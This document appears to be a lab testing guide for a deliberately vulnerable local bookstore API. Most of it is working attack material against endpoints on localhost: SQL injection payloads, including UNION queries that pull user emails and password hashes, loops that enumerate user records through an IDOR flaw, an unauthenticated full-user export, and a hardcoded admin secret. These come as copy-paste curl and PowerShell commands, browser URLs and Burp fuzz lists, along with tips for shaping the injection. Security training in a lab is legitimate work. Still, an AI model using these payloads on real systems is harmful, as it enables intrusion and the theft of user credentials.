# Lab Payload Guide - Testing Payloads

## 1. SQL Injection - /api/books/search

**Endpoint:** `GET https://localhost:8443/api/books/search?q=PAYLOAD`

### Test Payloads:

**1.1 Test Basic Injection:**
```
q=a' OR '1'='1
```
✅ Expected: Returns all books

**1.2 Extract User Data via UNION:**
```
q=%') UNION SELECT id, email, password_hash, full_name, phone, address, role, status, '', '', '', '', '', '', 0, 0, 0, 0 FROM users--
```
✅ Expected: User data with password hash in results

**1.3 Simple OR (bypass LIKE):**
```
q=%' OR '1'='1
```
✅ Expected: All books returned

**1.4 Get Database Tables:**
```
q=%') UNION SELECT table_name, table_name, table_name, table_name, table_name, table_name, table_name, table_name, '', '', '', '', '', '', 0, 0, 0, 0 FROM information_schema.tables WHERE table_schema='public'--
```

---

## 2. IDOR - /api/profile/user-info

**Endpoint:** `GET https://localhost:8443/api/profile/user-info?userId=PAYLOAD`

### Test Payloads:

**2.1 Enumerate User IDs (no auth check):**
```
userId=1
userId=2
userId=3
userId=4
userId=5
```
✅ Expected: Get user info for each ID (should be restricted!)

**2.2 Get Admin User:**
```
userId=1
```

**2.3 Sequential Enumeration Script:**
```
for i in {1..20}; do
  curl -k "https://localhost:8443/api/profile/user-info?userId=$i"
done
```

---

## 3. Sensitive Data Exposure - /api/profile/export

**Endpoint:** `GET https://localhost:8443/api/profile/export`

### Test:

**3.1 Direct Access (No Auth):**
```
curl -k https://localhost:8443/api/profile/export
```
✅ Expected: JSON with all users + password_hash + email + phone

---

## 4. Hardcoded Secret - /api/admin/orders

**Endpoint:** `GET https://localhost:8443/api/admin/orders?secret=PAYLOAD`

### Test Payloads:

**4.1 Using Correct Secret:**
```
secret=dev-secret-key-change-me
```

**4.2 Using Header:**
```
X-Admin-Secret: dev-secret-key-change-me
```

---

## PowerShell Test Commands (Copy-Paste Ready)

### SQL Injection - Get All Books:
```powershell
$q = "%' OR '1'='1"
$encodedQ = [System.Web.HttpUtility]::UrlEncode($q)
curl -k "https://localhost:8443/api/books/search?q=$encodedQ" | ConvertFrom-Json | Select-Object -ExpandProperty count
```

### SQL Injection - Get User Passwords:
```powershell
$q = "%') UNION SELECT id, email, password_hash, full_name, phone, address, role, status, '', '', '', '', '', '', 0, 0, 0, 0 FROM users--"
$encodedQ = [System.Web.HttpUtility]::UrlEncode($q)
curl -k "https://localhost:8443/api/books/search?q=$encodedQ" | ConvertFrom-Json | Select-Object -ExpandProperty data | ForEach-Object { $_.email + " : " + $_.title }
```

### IDOR - Get User 1:
```powershell
curl -k "https://localhost:8443/api/profile/user-info?userId=1" | ConvertFrom-Json | Select-Object -ExpandProperty user
```

### IDOR - Enumerate Users 1-10:
```powershell
1..10 | ForEach-Object { 
  Write-Host "=== User $_ ===" -ForegroundColor Green
  curl -k "https://localhost:8443/api/profile/user-info?userId=$_" | ConvertFrom-Json | Select-Object -ExpandProperty user | Select-Object id, email, role
}
```

### Sensitive Data - Export All Users:
```powershell
curl -k "https://localhost:8443/api/profile/export" | ConvertFrom-Json | Select-Object -ExpandProperty users | Select-Object id, email, passwordHash -First 5
```

### Hardcoded Secret - Access Admin Orders:
```powershell
curl -k "https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me" | ConvertFrom-Json
```

---

## Browser URLs (Click to Test)

### SQL Injection - Get All Books:
```
https://localhost:8443/api/books/search?q=%' OR '1'='1--
```

### SQL Injection - Get User Passwords:
```
https://localhost:8443/api/books/search?q=%') UNION ALL SELECT id::bigint, email, password_hash, full_name, phone, address, role, status, ''::text, now()::timestamp, now()::timestamp, ''::text, 0::bigint, ''::text, 0::bigint, 0.0::numeric, 0::bigint, 0::bigint FROM users--
```

### IDOR:
```
https://localhost:8443/api/profile/user-info?userId=1
https://localhost:8443/api/profile/user-info?userId=2
https://localhost:8443/api/profile/user-info?userId=3
```

### Export:
```
https://localhost:8443/api/profile/export
```

### Admin Orders:
```
https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me
```

---

## Burp Suite Intruder - Automated Testing

### 1. SQL Injection Fuzzing
Endpoint: `/api/books/search?q=§PAYLOAD§`

Payloads:
```
'
'--
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--
```

### 2. IDOR - Sequential ID Test
Endpoint: `/api/profile/user-info?userId=§NUM§`

Payloads: 1, 2, 3, ..., 100

---

## Expected Results Summary

| Vuln | Endpoint | Payload | Status |
|---|---|---|---|
| SQL Inj (OR) | `/api/books/search?q=%' OR '1'='1--` | Returns all books | ✅ |
| SQL Inj (UNION) | `?q=%') UNION ALL SELECT ... FROM users--` | Gets ALL passwords | ✅ |
| IDOR | `/api/profile/user-info?userId=1,2,3...` | Enumerates users | ✅ |
| Sensitive Data | `/api/profile/export` | All users + passwords | ✅ |
| Hardcoded Secret | `?secret=dev-secret-key-change-me` | Access admin data | ✅ |

---

## Key Points

**SQL Injection Payload Structure:**
- Close first LIKE: `%')`
- Add UNION at query level: `UNION ALL SELECT ...`
- Match 18 columns from BASE_SELECT
- Cast types properly: `::bigint`, `::text`, `::timestamp`, `::numeric`
- Comment out rest: `--`

**Result Mapping:**
- Column 2 (email) appears as `title` in JSON
- Column 3 (password_hash) appears as `author` in JSON
- Look for emails/hashes in these fields!



